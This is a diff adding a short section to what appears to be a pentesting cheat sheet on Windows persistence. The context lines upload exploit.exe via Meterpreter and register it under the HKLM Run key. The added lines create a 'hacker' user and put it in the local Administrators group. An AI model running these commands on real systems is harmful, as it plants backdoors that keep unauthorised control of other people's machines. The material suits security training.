@@ -66,3 +66,12 @@ meterpreter > upload exploit.exe C:\Windows
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\exploit.exe" -v exploit.exe
 ```
 {% endcode %}
+
+### Create new user
+
+Another way to establish persistence is to create a new user and add to the administrator group.
+
+```
+cmd> net user hacker /add # add new user hacker.
+cmd> net localgroup "Administrators" hacker /add # add new user to local admin group.
+```
